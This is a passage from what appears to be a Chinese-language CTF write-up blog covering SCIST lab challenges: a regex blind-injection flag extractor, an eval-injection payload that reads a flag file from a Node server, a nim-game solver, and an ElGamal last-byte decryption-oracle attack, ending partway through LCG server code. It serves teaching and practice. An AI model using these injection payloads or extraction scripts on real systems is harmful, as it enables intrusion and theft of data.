class="built_in">len</span>(charset) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        char_to_test = charset[mid]</span><br><span class="line">        payload = <span class="string">f"^<span class="subst">{base_flag}</span><span class="subst">{char_to_test}</span>"</span></span><br><span class="line">        <span class="keyword">if</span> test_payload(payload):</span><br><span class="line">            <span class="comment"># å­—ç¬¦ç¬¦åˆæ¢ä»¶ï¼Œè¡¨ç¤ºåœ¨ç›®å‰çš„ç¯„åœå…§</span></span><br><span class="line">            <span class="keyword">return</span> char_to_test</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># å¦‚æœå­—å…ƒä¸åœ¨ç¯„åœå…§ï¼Œèª¿æ•´ç¯„åœ</span></span><br><span class="line">            <span class="keyword">if</span> (high - low &gt; <span class="number">15000</span>): <span class="comment"># ç™¼ç¾ regex ç”¨ [] çš„ç¯„åœå¥½åƒå·®ä¸å¤šåªæœ‰ 15000 å€‹å­—å…ƒ</span></span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                idx = low</span><br><span class="line">                <span class="keyword">while</span> idx &lt; high:</span><br><span class="line">                    idx = <span class="built_in">min</span>(idx + <span class="number">15000</span>, high)</span><br><span class="line">                    flag = flag <span class="keyword">or</span> test_payload(<span class="string">f"^<span class="subst">{base_flag}</span>[<span class="subst">{<span class="string">""</span>.join(charset[low:idx])}</span>]"</span>)</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">f"^<span class="subst">{base_flag}</span>[<span class="subst">{<span class="string">""</span>.join(charset[low:mid])}</span>]"</span></span><br><span class="line">                <span class="keyword">if</span> test_payload(payload):</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é–‹å§‹ç›²æ³¨</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] Extracting flag..."</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> extracted_flag.endswith(<span class="string">"}"</span>):</span><br><span class="line">    char = binary_search_for_char(extracted_flag, escaped_charset)</span><br><span class="line">    <span class="keyword">if</span> char:</span><br><span class="line">        extracted_flag += char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[+] Current flag: <span class="subst">{extracted_flag}</span>"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[!] No matching character found. Check charset or logic."</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"[+] Final flag: <span class="subst">{extracted_flag}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>SCIST{WOW_y0u_4r3_7h3_ï¼¢ï¼¬ï¼©ï¼®ï¼¤}</code></p><h3 id="calculator">calculator <a href="#calculator" class="headerlink"></a></h3><p>çœ‹äº†ä¸€ä¸‹ç¨‹å¼ç¢¼ï¼Œç™¼ç¾åœ¨ server.js æœ‰ä¸€å€‹evalï¼Œæ‰€ä»¥å°±å¯ä»¥ç›´æ¥æ³¨å…¥ï¼Œä¸¦ç™¼ç¾ dockerfile è£¡é¢æœ‰å¯« flag çš„åç¨±ï¼Œå°±å¾—åˆ°flag ã„Œ</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wss.<span class="title function_">on</span>(<span class="string">'connection'</span>, <span class="function">(<span class="params">ws</span>) =&gt;</span> {</span><br><span class="line">  ws.<span class="title function_">on</span>(<span class="string">'message'</span>, <span class="function">(<span class="params">message</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'Received:'</span>, message);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      <span class="keyword">let</span> result = <span class="built_in">eval</span>(<span class="string">'('</span> + message + <span class="string">')'</span>);</span><br><span class="line">      ws.<span class="title function_">send</span>(result);</span><br><span class="line">    } <span class="keyword">catch</span> (e) {</span><br><span class="line">      ws.<span class="title function_">send</span>(e.<span class="property">message</span>);</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag_3298fh9u32niaergjfwe9ij923.txt /</span></span><br></pre></td></tr></tbody></table></figure><p>payload:<code>(() =&gt; require("fs").readFileSync("/flag_3298fh9u32niaergjfwe9ij923.txt", "utf8"))()</code></p><p>flag: <code>SCIST{TRy_70_dO_5Om3_C@1cU1A7Or}</code></p><h2 id="misc">Misc <a href="#misc" class="headerlink"></a></h2><h3 id="trick-or-treat">Trick or Treat <a href="#trick-or-treat" class="headerlink"></a></h3><p>é€™é¡Œæ˜¯ä¸€å€‹ nim gameï¼Œå¯ä»¥ç”¨ nim sum ä¾†è§£ï¼Œå°±å¯«å€‹ script è¼•é¬†å¾—åˆ°flag</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_move</span>(<span class="params">state</span>):</span><br><span class="line">    nim_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> candies <span class="keyword">in</span> state:</span><br><span class="line">        nim_sum ^= candies</span><br><span class="line">    <span class="keyword">for</span> i, candies <span class="keyword">in</span> <span class="built_in">enumerate</span>(state):</span><br><span class="line">        target = candies ^ nim_sum</span><br><span class="line">        <span class="keyword">if</span> target &lt; candies:</span><br><span class="line">            remove = candies - target</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>, remove</span><br><span class="line">    <span class="comment"># æ²’æœ‰å¿…å‹ç§»å‹•æ™‚ï¼Œå¾ç¬¬ä¸€å€‹éç©ºç®±å­æ‹¿ 1 é¡†</span></span><br><span class="line">    <span class="keyword">for</span> i, candies <span class="keyword">in</span> <span class="built_in">enumerate</span>(state):</span><br><span class="line">        <span class="keyword">if</span> candies &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€£ç·šåˆ°é ç«¯ä¼ºæœå™¨ï¼ˆè«‹æ ¹æ“šå¯¦éš›ä¼ºæœå™¨ä½å€èˆ‡ port ä¿®æ”¹ï¼‰</span></span><br><span class="line">io = remote(<span class="string">"lab.scist.org"</span>, <span class="number">31418</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"HELLO"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(io.recvuntil(<span class="string">b'boxes, each contains '</span>))</span><br><span class="line">    st = io.recvuntil(<span class="string">b'c'</span>).decode().strip(<span class="string">'c'</span>).split(<span class="string">', '</span>)</span><br><span class="line">    st = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> st]</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">sum</span>(st) &gt; <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Current state:"</span>, st)</span><br><span class="line">        out = compute_move(st)</span><br><span class="line">        io.recvuntil(<span class="string">b"It's your turn, entering (n, k) denotes to take k candy from the box n: "</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(out).encode())</span><br><span class="line">        st[out[<span class="number">0</span>] - <span class="number">1</span>] -= out[<span class="number">1</span>]</span><br><span class="line">        io.recvline()</span><br><span class="line">        <span class="keyword">if</span> io.recvuntil(<span class="string">b' '</span>).decode() == <span class="string">'Mission '</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        io.recvuntil(<span class="string">b'I take '</span>)</span><br><span class="line">        robot_take = <span class="built_in">int</span>(io.recvuntil(<span class="string">b' '</span>).decode())</span><br><span class="line">        io.recvuntil(<span class="string">b'box '</span>)</span><br><span class="line">        robot_box = <span class="built_in">int</span> (io.recvuntil(<span class="string">b'.'</span>).decode()[:-<span class="number">1</span>])</span><br><span class="line">        st[robot_box - <span class="number">1</span>] -= robot_take</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>SCIST{trick-or-treat? trick-xor-treat!}</code></p><h2 id="crypto">Crypto <a href="#crypto" class="headerlink"></a></h2><h3 id="elgamal-oracle---é¦–æ®º">Elgamal oracle - é¦–æ®º / <a href="#elgamal-oracle---é¦–æ®º" class="headerlink"></a></h3><p>æ˜¯å€‹ç™½ç®±ï¼Œçœ‹çœ‹æ˜¯æ€éº¼åŠ å¯†çš„</p><figure class="highlight python"><figcaption><span>server.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Random.random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, isPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElGamal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbit: <span class="built_in">int</span> = <span class="number">1024</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.nbyte = nbit // <span class="number">8</span></span><br><span class="line">        <span class="variable language_">self</span>.p = getPrime(nbit)</span><br><span class="line">        <span class="variable language_">self</span>.g = <span class="variable language_">self</span>.gen_generator()</span><br><span class="line">        <span class="variable language_">self</span>.x = randrange(<span class="number">2</span>, <span class="variable language_">self</span>.p - <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.y = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_generator</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="variable language_">self</span>.gen_prime():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(g, (<span class="variable language_">self</span>.p - <span class="number">1</span>) // <span class="number">2</span>, <span class="variable language_">self</span>.p) == <span class="variable language_">self</span>.p - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"It's impossible to get here."</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_prime</span>() -&gt; typing.Generator[<span class="built_in">int</span>, <span class="literal">None</span>, <span class="literal">None</span>]:</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> (<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> itertools.count(<span class="number">5</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime(k):</span><br><span class="line">                <span class="keyword">yield</span> k</span><br><span class="line">            <span class="keyword">if</span> isPrime(k + <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">yield</span> k + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">public_key</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps({<span class="string">"g"</span>: <span class="variable language_">self</span>.g, <span class="string">"y"</span>: <span class="variable language_">self</span>.y, <span class="string">"p"</span>: <span class="variable language_">self</span>.p})</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        m = bytes_to_long(plaintext)</span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt; m &lt; <span class="variable language_">self</span>.p</span><br><span class="line">        k = randrange(<span class="number">2</span>, <span class="variable language_">self</span>.p - <span class="number">2</span>)</span><br><span class="line">        c1 = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, k, <span class="variable language_">self</span>.p)</span><br><span class="line">        c2 = m * <span class="built_in">pow</span>(<span class="variable language_">self</span>.y, k, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b""</span>.join(</span><br><span class="line">            c.to_bytes(<span class="variable language_">self</span>.nbyte, byteorder=<span class="string">"big"</span>)</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> (c1, c2)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ciphertext) == <span class="number">2</span> * <span class="variable language_">self</span>.nbyte</span><br><span class="line">        c1, c2 = <span class="built_in">tuple</span>(</span><br><span class="line">            <span class="built_in">int</span>.from_bytes(ciphertext[idx:idx+<span class="variable language_">self</span>.nbyte], byteorder=<span class="string">"big"</span>)</span><br><span class="line">            <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="variable language_">self</span>.nbyte)</span><br><span class="line">        )</span><br><span class="line">        m = <span class="built_in">pow</span>(c1, -<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.p) * c2 % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_server</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./server.py"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    cipher = ElGamal()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"public_key: <span class="subst">{cipher.public_key}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"flag: <span class="subst">{cipher.encrypt(FLAG.encode()).<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(cipher.nbyte):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; decrypt"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; server.py"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; exit"</span>)</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">"&gt; Command: "</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">"exit"</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"decrypt"</span>:</span><br><span class="line">            ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">"&gt; Enter ciphertext: "</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"plaintext last byte: <span class="subst">{cipher.decrypt(ciphertext)[-<span class="number">1</span>]}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"server.py"</span>:</span><br><span class="line">            read_server()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bad hacker"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>æ¯æ¬¡åªæœƒçµ¦ ciphertext è§£å¯†å¾Œçš„æœ€å¾Œä¸€å€‹ byteï¼Œè©¦è‘—é‹ç”¨ homomorphicä¾†è§£é€™é¡Œ</p><p><span class="math inline">\(c2 \cdot k \mod p = m \cdot k \modp\)</span></p><p>æˆ‘å€‘æ¯æ¬¡å¯ä»¥å¾—åˆ°</p><p><span class="math inline">\(m \mod 256\)</span></p><p>å¸Œæœ›å¯ä»¥è¿­ä»£åšåˆ°</p><p><span class="math inline">\(\lfloor \frac{m}{256}  \rfloor \mod 256 ,\lfloor \frac{m}{256 ^ 2}  \rfloor \mod 256, \lfloor \frac{m}{256 ^3}  \rfloor \mod 256, \cdots\)</span></p><p>æƒ³åˆ°å¯ä»¥ç”¨åæ¨¡æ•¸ä¾†è¨ˆç®—ï¼Œä»¤ <span class="math inline">\(s \equiv256^{-1} \mod p\)</span></p><p><span class="math display">\[\begin{align*}\lfloor \frac{m}{256}  \rfloor \mod 256 &amp;= (m - (m \mod 256)) \cdots \mod p \mod 256 \\&amp;= (256 + ((m \cdot s \mod p \mod 256) - ((m \mod 256) \cdot s \modp \mod 256))) \mod 256\end{align*}\]</span></p><p>å°±é€™æ¨£ä¸æ–·è¿­ä»£å°±å¯ä»¥å¾—åˆ° flag ã„Œ</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    conn = remote(<span class="string">'lab.scist.org'</span>, <span class="number">31415</span>)</span><br><span class="line">    <span class="comment"># conn = process(['python3', 'server.py'])</span></span><br><span class="line">    </span><br><span class="line">    line = conn.recvline().decode().strip()</span><br><span class="line">    public_key = json.loads(line.split(<span class="string">': '</span>, <span class="number">1</span>)[<span class="number">1</span>])</span><br><span class="line">    p = public_key[<span class="string">'p'</span>]</span><br><span class="line">    g = public_key[<span class="string">'g'</span>]</span><br><span class="line">    y = public_key[<span class="string">'y'</span>]</span><br><span class="line">    </span><br><span class="line">    line = conn.recvline().decode().strip()</span><br><span class="line">    flag_hex = line.split(<span class="string">': '</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    flag_bytes = <span class="built_in">bytes</span>.fromhex(flag_hex)</span><br><span class="line">    nbyte = <span class="number">128</span> </span><br><span class="line">    c1_flag = <span class="built_in">int</span>.from_bytes(flag_bytes[:nbyte], <span class="string">'big'</span>)</span><br><span class="line">    c2_flag = <span class="built_in">int</span>.from_bytes(flag_bytes[nbyte:], <span class="string">'big'</span>)</span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    s = <span class="built_in">pow</span>(<span class="number">256</span>, -<span class="number">1</span>, p)</span><br><span class="line">    </span><br><span class="line">    bytes_list = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line"></span><br><span class="line">        ciphertext = c1_flag.to_bytes(nbyte, <span class="string">'big'</span>) + (c2_flag % p).to_bytes(nbyte, <span class="string">'big'</span>)</span><br><span class="line"></span><br><span class="line">        conn.sendlineafter(<span class="string">"&gt; Command: "</span>, <span class="string">"decrypt"</span>)</span><br><span class="line">        conn.sendlineafter(<span class="string">"&gt; Enter ciphertext: "</span>, ciphertext.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">        resp = conn.recvline().decode().strip()</span><br><span class="line">        last_byte = <span class="built_in">int</span>(resp.split(<span class="string">': '</span>)[<span class="number">1</span>])</span><br><span class="line">        last_byte = (<span class="number">256</span> + (last_byte) - (m * <span class="built_in">pow</span>(s, i) % p)) % <span class="number">256</span></span><br><span class="line">        m += last_byte * <span class="built_in">pow</span>(<span class="number">256</span>, i)</span><br><span class="line">        bytes_list.append(last_byte)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{i}</span>: <span class="subst">{<span class="built_in">chr</span>(last_byte)}</span>"</span>)</span><br><span class="line">        c2_flag = (c2_flag * s)</span><br><span class="line">    </span><br><span class="line">    bytes_list.reverse()</span><br><span class="line">    flag = <span class="built_in">bytes</span>(bytes_list).decode(errors=<span class="string">'replace'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Flag:"</span>, flag)</span><br><span class="line">    </span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>flag:<code>SCIST{I said elgamal can perform homomorphic encryption in class. :)}</code></p><h3 id="lcg-cipher---é¦–æ®º">LCG cipher - é¦–æ®º / <a href="#lcg-cipher---é¦–æ®º" class="headerlink"></a></h3><figure class="highlight python"><figcaption><span>server.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> abc</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>(abc.ABC):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>(<span class="title class_ inherited__">PRNG</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbit: <span class="built_in">int</span> = <span class="number">128</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.nbyte = nbit // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.a = getPrime(nbit // <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.c = getPrime(nbit // <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.m = getPrime(nbit)</span><br><span class="line">        <span class="variable language_">self</span>.seed = getPrime(nbit // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>) -&gt; typing.Generator[<span class="built_in">int</span>, <span class="literal">None</span>, <span class="literal">None</span>]:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="variable language_">self</span>.seed = (<span class="variable language_">self</span>.a * <span class="variable language_">self</span>.seed + <span class="variable language_">self</span>.c) % <span class="variable language_">self</span>.m</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> <span 